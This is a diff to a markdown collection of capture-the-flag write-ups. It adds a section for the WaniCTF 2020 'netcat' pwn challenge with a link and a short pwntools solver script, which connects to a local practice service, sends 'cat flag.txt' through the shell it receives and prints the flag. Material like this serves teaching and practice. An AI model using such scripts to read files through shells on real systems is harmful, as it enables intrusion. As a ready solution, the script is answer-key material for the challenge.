@@ -82,3 +82,20 @@ log.success("FLAG{%s", io.recvuntil(b"}").decode())
 # ----------------------------------------
 io.interactive()
 ```
+
+# pwn
+
+## 01-netcat
+
+- https://github.com/wani-hackase/wanictf2020-writeup/tree/master/pwn/01-netcat
+
+```python
+#!/usr/bin/env python3
+from pwn import log, remote
+io = remote("::1", 9001)
+io.recvuntil(b"congratulation!\n")
+io.sendline(b"cat flag.txt")
+io.recvuntil(b"FLAG{")
+log.success("FLAG{%s", io.recvuntil(b"}").decode("latin-1"))
+io.close()
+```
